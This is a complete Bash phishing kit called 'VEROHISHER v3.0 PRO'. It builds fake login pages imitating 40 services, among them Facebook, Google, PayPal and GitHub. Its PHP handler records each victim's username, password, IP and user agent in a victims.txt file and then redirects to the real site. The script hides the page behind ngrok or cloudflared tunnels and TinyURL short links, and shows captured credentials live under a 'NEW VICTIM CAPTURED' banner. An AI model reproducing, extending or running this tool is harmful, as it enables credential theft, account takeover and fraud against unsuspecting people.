#!/bin/bash

# VEROHISHER v3.0 PRO
# Created by Vikk Official
# 40 Templates | Professional UI | Auto Mask URL

trap ctrl_c INT
ctrl_c() {
    echo -e "\n\033[1;91m\n[!] Stopping VEROHISHER...\n\033[0m"
    pkill -f php 2>/dev/null
    pkill -f ngrok 2>/dev/null
    pkill -f cloudflared 2>/dev/null
    rm -rf .server 2>/dev/null
    exit 1
}

# Warna Enhanced
R='\033[1;91m'
G='\033[1;92m'
Y='\033[1;93m'
B='\033[1;94m'
P='\033[1;95m'
C='\033[1;96m'
W='\033[1;97m'
NC='\033[0m'
BG_R='\033[41m'
BG_G='\033[42m'
BG_B='\033[44m'
BOLD='\033[1m'
UNDERLINE='\033[4m'

# Animasi loading
loading() {
    echo -ne "${Y}[${G}■${Y}]${NC} $1"
    for i in {1..3}; do
        echo -ne "."
        sleep 0.3
    done
    echo -e " ${G}✓${NC}"
}

# Banner Profesional
banner() {
    clear
    echo -e "${C}
    ╔══════════════════════════════════════════════════════════════════════════╗
    ║                                                                          ║
    ║      ██╗   ██╗███████╗██████╗  ██████╗ ██╗  ██╗██╗███████╗██╗███████╗    ║
    ║      ██║   ██║██╔════╝██╔══██╗██╔═══██╗██║  ██║██║██╔════╝██║██╔════╝    ║
    ║      ██║   ██║█████╗  ██████╔╝██║   ██║███████║██║███████╗██║███████╗    ║
    ║      ╚██╗ ██╔╝██╔══╝  ██╔══██╗██║   ██║██╔══██║██║╚════██║██║╚════██║    ║
    ║       ╚████╔╝ ███████╗██║  ██║╚██████╔╝██║  ██║██║███████║██║███████║    ║
    ║        ╚═══╝  ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝╚═╝╚══════╝    ║
    ║                                                                          ║
    ╠══════════════════════════════════════════════════════════════════════════╣
    ║                      ${W}VEROHISHER v3.0 PRO | 40 Templates${C}                    ║
    ║                      ${W}Created by Vikk Official${C}                              ║
    ╚══════════════════════════════════════════════════════════════════════════╝
    "
}

# Cek dependency dengan loading
dependencies() {
    echo -e "${C}┌──────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${C}│${W}                    CHECKING DEPENDENCIES                            ${C}│${NC}"
    echo -e "${C}└──────────────────────────────────────────────────────────────────────┘${NC}"
    
    commands=("php" "curl" "wget" "unzip")
    for cmd in "${commands[@]}"; do
        if ! command -v $cmd &>/dev/null; then
            echo -e "${R}[!] $cmd not found! Installing...${NC}"
            pkg install $cmd -y >/dev/null 2>&1
        fi
        echo -e "${G}[✓] $cmd installed${NC}"
    done
    
    if [[ ! -e ngrok ]]; then
        loading "Downloading ngrok"
        wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip >/dev/null 2>&1
        unzip ngrok-stable-linux-arm.zip >/dev/null 2>&1
        chmod +x ngrok
        rm ngrok-stable-linux-arm.zip
    fi
    
    if [[ ! -e cloudflared ]]; then
        loading "Downloading cloudflared"
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm >/dev/null 2>&1
        mv cloudflared-linux-arm cloudflared
        chmod +x cloudflared
    fi
    
    echo -e "${G}┌──────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${G}│${W}                    ALL DEPENDENCIES READY                          ${G}│${NC}"
    echo -e "${G}└──────────────────────────────────────────────────────────────────────┘${NC}"
    sleep 1
}

# Generate template (sama seperti sebelumnya tapi dengan logging lebih baik)
generate_template() {
    local site=$1
    mkdir -p .server 2>/dev/null
    rm -rf .server/* 2>/dev/null
    
    # Template mapping (40 sites - sama seperti sebelumnya)
    case $site in
        1)  name="Facebook"; logo="facebook"; color="#1877f2"; input1="Email or Phone"; input2="Password"; action="https://facebook.com";;
        2)  name="Instagram"; logo="instagram"; color="#e4405f"; input1="Username"; input2="Password"; action="https://instagram.com";;
        3)  name="Google"; logo="google"; color="#4285f4"; input1="Email"; input2="Password"; action="https://google.com";;
        4)  name="Twitter"; logo="twitter"; color="#1da1f2"; input1="Phone or Email"; input2="Password"; action="https://twitter.com";;
        5)  name="Microsoft"; logo="microsoft"; color="#f25022"; input1="Email"; input2="Password"; action="https://microsoft.com";;
        6)  name="Netflix"; logo="netflix"; color="#e50914"; input1="Email or Phone"; input2="Password"; action="https://netflix.com";;
        7)  name="PayPal"; logo="paypal"; color="#003087"; input1="Email"; input2="Password"; action="https://paypal.com";;
        8)  name="Steam"; logo="steam"; color="#171a21"; input1="Steam Account Name"; input2="Password"; action="https://steamcommunity.com";;
        9)  name="Snapchat"; logo="snapchat"; color="#fffc00"; input1="Username"; input2="Password"; action="https://snapchat.com";;
        10) name="TikTok"; logo="tiktok"; color="#010101"; input1="Email or Username"; input2="Password"; action="https://tiktok.com";;
        11) name="LinkedIn"; logo="linkedin"; color="#0077b5"; input1="Email"; input2="Password"; action="https://linkedin.com";;
        12) name="GitHub"; logo="github"; color="#181717"; input1="Username"; input2="Password"; action="https://github.com";;
        13) name="Reddit"; logo="reddit"; color="#ff4500"; input1="Username"; input2="Password"; action="https://reddit.com";;
        14) name="Twitch"; logo="twitch"; color="#9146ff"; input1="Username"; input2="Password"; action="https://twitch.tv";;
        15) name="Spotify"; logo="spotify"; color="#1db954"; input1="Email or Username"; input2="Password"; action="https://spotify.com";;
        16) name="Amazon"; logo="amazon"; color="#ff9900"; input1="Email"; input2="Password"; action="https://amazon.com";;
        17) name="Apple"; logo="apple"; color="#999999"; input1="Apple ID"; input2="Password"; action="https://apple.com";;
        18) name="WhatsApp"; logo="whatsapp"; color="#25d366"; input1="Phone Number"; input2="Password"; action="https://web.whatsapp.com";;
        19) name="Telegram"; logo="telegram"; color="#26a5e4"; input1="Phone Number"; input2="Password"; action="https://web.telegram.org";;
        20) name="Discord"; logo="discord"; color="#5865f2"; input1="Email"; input2="Password"; action="https://discord.com";;
        21) name="Yahoo"; logo="yahoo"; color="#6001d2"; input1="Email"; input2="Password"; action="https://yahoo.com";;
        22) name="eBay"; logo="ebay"; color="#e53238"; input1="Email"; input2="Password"; action="https://ebay.com";;
        23) name="Dropbox"; logo="dropbox"; color="#0061ff"; input1="Email"; input2="Password"; action="https://dropbox.com";;
        24) name="Adobe"; logo="adobe"; color="#ff0000"; input1="Email"; input2="Password"; action="https://adobe.com";;
        25) name="WordPress"; logo="wordpress"; color="#21759b"; input1="Username"; input2="Password"; action="https://wordpress.com";;
        26) name="Tumblr"; logo="tumblr"; color="#36465d"; input1="Email"; input2="Password"; action="https://tumblr.com";;
        27) name="Pinterest"; logo="pinterest"; color="#bd081c"; input1="Email"; input2="Password"; action="https://pinterest.com";;
        28) name="Flickr"; logo="flickr"; color="#0063dc"; input1="Email"; input2="Password"; action="https://flickr.com";;
        29) name="Myspace"; logo="myspace"; color="#003399"; input1="Email"; input2="Password"; action="https://myspace.com";;
        30) name="VK"; logo="vk"; color="#4680c2"; input1="Phone or Email"; input2="Password"; action="https://vk.com";;
        31) name="Line"; logo="line"; color="#00c300"; input1="Email"; input2="Password"; action="https://line.me";;
        32) name="WeChat"; logo="wechat"; color="#7bb32e"; input1="WeChat ID"; input2="Password"; action="https://wechat.com";;
        33) name="Signal"; logo="signal"; color="#3a76f0"; input1="Phone Number"; input2="Password"; action="https://signal.org";;
        34) name="IMDb"; logo="imdb"; color="#f5c518"; input1="Email"; input2="Password"; action="https://imdb.com";;
        35) name="Hulu"; logo="hulu"; color="#1ce783"; input1="Email"; input2="Password"; action="https://hulu.com";;
        36) name="Disney+"; logo="disney"; color="#1134a6"; input1="Email"; input2="Password"; action="https://disneyplus.com";;
        37) name="Epic Games"; logo="epicgames"; color="#313131"; input1="Email"; input2="Password"; action="https://epicgames.com";;
        38) name="Origin"; logo="origin"; color="#ff6f00"; input1="Email"; input2="Password"; action="https://origin.com";;
        39) name="Uplay"; logo="ubisoft"; color="#1f1f1f"; input1="Username"; input2="Password"; action="https://ubisoft.com";;
        40) 
            name="Custom URL"
            logo="custom"
            color="#555555"
            input1="Username/Email"
            input2="Password"
            echo -e -n "${W}Enter custom redirect URL: ${NC}"
            read custom_action
            action="$custom_action"
            ;;
    esac
    
    loading "Creating $name template"
    
    cat > .server/index.html << EOF
<!DOCTYPE html>
<html>
<head>
    <title>$name - Login</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .card { background: white; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); overflow: hidden; }
        .header { background: $color; padding: 30px; text-align: center; }
        .logo { font-size: 48px; font-weight: bold; color: white; text-transform: uppercase; letter-spacing: 2px; }
        .content { padding: 30px; }
        .input-group { margin-bottom: 20px; }
        input { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; transition: 0.2s; }
        input:focus { outline: none; border-color: $color; box-shadow: 0 0 0 2px rgba($color,0.2); }
        button { background: $color; color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; }
        button:hover { opacity: 0.9; }
        .footer { text-align: center; padding: 20px; background: #f8f9fa; font-size: 12px; color: #666; }
        .error { color: red; font-size: 12px; margin-top: 10px; text-align: center; display: none; }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <div class="header">
            <div class="logo">$logo</div>
        </div>
        <div class="content">
            <div class="input-group">
                <input type="text" id="username" placeholder="$input1" autocomplete="off">
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="$input2">
            </div>
            <button onclick="login()">Log In</button>
            <div id="error" class="error">Invalid credentials, please try again.</div>
        </div>
        <div class="footer">
            &copy; 2025 $name
        </div>
    </div>
</div>
<script>
    function login() {
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;
        if (username === '' || password === '') {
            document.getElementById('error').style.display = 'block';
            return;
        }
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/login.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password));
        document.getElementById('error').style.display = 'block';
        document.getElementById('password').value = '';
    }
</script>
</body>
</html>
EOF

    cat > .server/login.php << EOF
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];
\$date = date('Y-m-d H:i:s');
\$username = \$_POST['username'];
\$password = \$_POST['password'];
\$useragent = \$_SERVER['HTTP_USER_AGENT'];
\$data = "[ \$date ] IP: \$ip | User: \$username | Pass: \$password | UA: \$useragent\n";
file_put_contents('victims.txt', \$data, FILE_APPEND);
header('Location: $action');
?>
EOF

    echo -e "${G}[✓] $name template ready${NC}"
}

# Mask URL dengan tinyurl
mask_url() {
    local url=$1
    echo -e -n "${W}Mask URL with tinyurl? (y/n): ${NC}"
    read mask_choice
    if [[ $mask_choice == "y" || $mask_choice == "Y" ]]; then
        loading "Generating short URL"
        masked=$(curl -s "http://tinyurl.com/api-create.php?url=$url")
        if [[ -n "$masked" ]]; then
            echo "$masked" > .masked_link
            echo -e "${G}[✓] Masked URL: $masked${NC}"
        else
            echo -e "${R}[!] Masking failed, using original${NC}"
            masked=$url
        fi
    else
        masked=$url
    fi
    echo "$masked" > .final_link
}

# Start services
start_services() {
    loading "Starting PHP server"
    cd .server
    php -S 0.0.0.0:8080 > /dev/null 2>&1 &
    cd ..
    sleep 2
    
    echo -e "${Y}[*] Select tunnel:${NC}"
    echo -e "${C}┌────────────────────┐${NC}"
    echo -e "${C}│ 1. Ngrok          │${NC}"
    echo -e "${C}│ 2. Cloudflared    │${NC}"
    echo -e "${C}└────────────────────┘${NC}"
    echo -e -n "${W}Tunnel option: ${NC}"
    read tunnel_opt
    
    case $tunnel_opt in
        1)
            loading "Starting ngrok"
            ./ngrok http 8080 --log=ngrok.log > /dev/null 2>&1 &
            sleep 6
            LINK=$(curl -s http://localhost:4040/api/tunnels | grep -o 'https://[a-z0-9]*\.ngrok\.io' | head -1)
            ;;
        2)
            loading "Starting cloudflared"
            ./cloudflared tunnel --url http://localhost:8080 > /dev/null 2>&1 &
            sleep 6
            LINK=$(curl -s http://localhost:4040/api/tunnels | grep -o 'https://[a-z0-9]*\.trycloudflare\.com' | head -1)
            ;;
        *)
            loading "Starting ngrok (default)"
            ./ngrok http 8080 --log=ngrok.log > /dev/null 2>&1 &
            sleep 6
            LINK=$(curl -s http://localhost:4040/api/tunnels | grep -o 'https://[a-z0-9]*\.ngrok\.io' | head -1)
            ;;
    esac
    
    if [[ -z "$LINK" ]]; then
        echo -e "${R}[!] Tunnel failed!${NC}"
        exit 1
    fi
    
    echo -e "${G}[✓] Tunnel active: $LINK${NC}"
    echo "$LINK" > .link
}

# Tampilkan hasil dengan tabel
show_logs() {
    echo -e "\n${C}┌──────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${C}│${W}                      WAITING FOR VICTIM                              ${C}│${NC}"
    echo -e "${C}├──────────────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${C}│${G} LINK: ${W}$(cat .final_link)${C}                                                               │${NC}"
    echo -e "${C}└──────────────────────────────────────────────────────────────────────┘${NC}"
    
    # Auto copy to clipboard if termux-clipboard exists
    if command -v termux-clipboard-set &>/dev/null; then
        echo -n "$(cat .final_link)" | termux-clipboard-set
        echo -e "${G}[✓] Link copied to clipboard!${NC}"
    fi
    
    echo -e "\n${Y}[*] Status: ${G}ONLINE${NC} | ${Y}Waiting for target...${NC}"
    echo -e "${C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    while true; do
        if [[ -e .server/victims.txt ]]; then
            clear
            banner
            echo -e "${R}┌──────────────────────────────────────────────────────────────────────┐${NC}"
            echo -e "${R}│${W}                      NEW VICTIM CAPTURED!                           ${R}│${NC}"
            echo -e "${R}├──────────────────────────────────────────────────────────────────────┤${NC}"
            echo -e "${R}│${NC}"
            cat .server/victims.txt
            echo -e "${R}│${NC}"
            echo -e "${R}└──────────────────────────────────────────────────────────────────────┘${NC}"
            echo -e "\n${Y}[*] Press Ctrl+C to stop or wait for more...${NC}"
            echo -e "${C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
            sleep 8
        fi
        sleep 2
    done
}

# Menu utama (grid 2 kolom)
menu() {
    banner
    echo -e "${C}┌──────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${C}│${W}                    SELECT TARGET PLATFORM (1-40)                    ${C}│${NC}"
    echo -e "${C}├─────────────────────────────┬────────────────────────────────────────┤${NC}"
    echo -e "${C}│ 1.Facebook    2.Instagram   │ 21.Yahoo      22.eBay                   │${NC}"
    echo -e "${C}│ 3.Google      4.Twitter     │ 23.Dropbox    24.Adobe                  │${NC}"
    echo -e "${C}│ 5.Microsoft   6.Netflix     │ 25.WordPress  26.Tumblr                 │${NC}"
    echo -e "${C}│ 7.PayPal      8.Steam       │ 27.Pinterest  28.Flickr                 │${NC}"
    echo -e "${C}│ 9.Snapchat   10.TikTok      │ 29.Myspace    30.VK                     │${NC}"
    echo -e "${C}│11.LinkedIn   12.GitHub      │ 31.Line       32.WeChat                 │${NC}"
    echo -e "${C}│13.Reddit     14.Twitch      │ 33.Signal     34.IMDb                   │${NC}"
    echo -e "${C}│15.Spotify    16.Amazon      │ 35.Hulu       36.Disney+                │${NC}"
    echo -e "${C}│17.Apple      18.WhatsApp    │ 37.EpicGames  38.Origin                 │${NC}"
    echo -e "${C}│19.Telegram   20.Discord     │ 39.Uplay      40.Custom URL             │${NC}"
    echo -e "${C}└─────────────────────────────┴────────────────────────────────────────┘${NC}"
    echo -e -n "${W}[VEROHISHER] Enter number: ${NC}"
    read option
    
    if [[ ! $option =~ ^[0-9]+$ ]] || [[ $option -lt 1 || $option -gt 40 ]]; then
        echo -e "${R}[!] Invalid option!${NC}"
        sleep 1
        menu
    fi
    
    generate_template $option
    start_services
    mask_url "$LINK"
    show_logs
}

# Main
clear
dependencies
menu
